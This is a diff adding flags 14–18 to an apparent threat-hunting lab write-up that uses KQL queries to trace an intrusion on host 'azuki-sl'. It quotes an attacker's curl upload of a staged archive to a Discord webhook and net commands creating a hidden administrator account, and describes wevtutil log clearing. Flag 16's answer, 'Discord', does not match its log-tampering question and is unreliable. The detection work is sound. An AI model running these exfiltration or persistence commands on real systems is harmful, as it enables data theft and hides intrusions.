@@ -263,3 +263,98 @@ Resource used: <a href="https://github.com/gentilkiwi/mimikatz/wiki">Mimikatz</a
 
 🚩 Flag 13 - sekurlsa::logonpasswords
  
+<h3>Flag 14: COLLECTION - Data Staging Archive</h3>
+
+Attackers compress stolen data for efficient exfiltration. The archive filename often includes dates or descriptive names for the attacker's organisation.
+
+<h3>KQL Query:</h3>
+
+DeviceFileEvents<br>
+| where DeviceName == "azuki-sl" <br>
+| where FolderPath has "C:\\ProgramData\\WindowsCache" <br>
+| where FileName endswith ".zip" <br>
+| project Timestamp, FileName, FolderPath, ActionType <br>
+| order by Timestamp asc <br>
+
+Query results showed that export-data.zip was staged in the hidden directory C:\ProgramData\WindowsCache*, indicating preparation for data exfiltration.
+
+<img width="1240" height="142" alt="image" src="https://github.com/user-attachments/assets/bee7dddf-3b1e-4471-8183-995e23beb5f6" />
+
+🚩 Flag 14 - export-data.zip
+
+<h3>Flag 15: EXFILTRATION - Exfiltration Channel</h3>
+ 
+Cloud services with upload capabilities are frequently abused for data theft. Identifying the service helps with incident scope determination and potential data recovery.
+
+<h3>KQL Query:</h3>
+
+DeviceProcessEvents <br>
+| where DeviceName == "azuki-sl" <br>
+| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20)) <br>
+| where ProcessCommandLine has_any ("http", "https") <br>
+| project Timestamp, FileName, ProcessCommandLine <br>
+| order by Timestamp asc <br>
+
+The attacker used curl.exe to upload the staged archive export-data.zip to a Discord webhook URL.
+
+curl.exe -F file=@C:\ProgramData\WindowsCache\export-data.zip https://discord.com/api/webhooks/...
+
+This represents data exfiltration via an encrypted HTTPS channel to a third-party cloud service (Discord).
+
+Because Discord webhooks do not require authentication and accept arbitrary file uploads, the attacker was able to exfiltrate stolen contract and pricing data with minimal detection.
+
+<img width="1240" height="108" alt="image" src="https://github.com/user-attachments/assets/93b7ac83-240f-4295-aa75-2b0683a1c4cf" />
+
+🚩 Flag 15 - Discord
+
+
+<h3>Flag 16: ANTI-FORENSICS - Log Tampering</h3>
+
+Clearing event logs destroys forensic evidence and impedes investigation efforts. The order of log clearing can indicate attacker priorities and sophistication.
+
+<h3>KQL Query:</h3>
+
+DeviceProcessEvents <br>
+| where DeviceName == "azuki-sl" <br>
+| where FileName =~ "wevtutil.exe" <br>
+| project Timestamp, ProcessCommandLine <br>
+| order by Timestamp asc <br>
+
+The attacker initiated log clearing using wevtutil.exe, beginning with the Security event log.
+
+Clearing the Security log first is a common anti-forensics step because it contains authentication events, RDP logons, privilege escalations, scheduled task creation, and credential access detections — all critical evidence of the compromise.
+
+<img width="1240" height="85" alt="image" src="https://github.com/user-attachments/assets/126bfff0-3259-416e-9cc2-a99232308823" />
+
+🚩 Flag 16 - Discord
+
+
+<h3>Flag 17: IMPACT - Persistence Account</h3>
+
+Hidden administrator accounts provide alternative access for future operations. These accounts are often configured to avoid appearing in normal user interfaces.
+
+<h3>KQL Query:</h3>
+
+DeviceProcessEvents <br>
+| where DeviceName == "azuki-sl" <br>
+| where ProcessCommandLine has "/add" <br>
+| project Timestamp, AccountName, ProcessCommandLine <br>
+| order by Timestamp asc <br>
+
+The attacker created a local account named support using net user support <password> /add and added it to the Administrators group with net localgroup administrators support /add.
+
+<img width="1240" height="198" alt="image" src="https://github.com/user-attachments/assets/0dd2f64a-1975-4ccd-8bb5-f98b636d5a40" />
+
+🚩 Flag 17 - support
+
+<h3>Flag 18: EXECUTION - Malicious Script</h3>
+
+Attackers often use scripting languages to automate their attack chain. Identifying the initial attack script reveals the entry point and automation method used in the compromise.
+
+<h3>KQL Query:</h3>
+
+DeviceProcessEvents <br>
+| where DeviceName == "azuki-sl" <br>
+| where ProcessCommandLine has_any (".ps1", ".bat", "Invoke-WebRequest", "iwr", "wget") <br>
+| project Timestamp, FileName, ProcessCommandLine <br>
+| order by Timestamp asc <br>
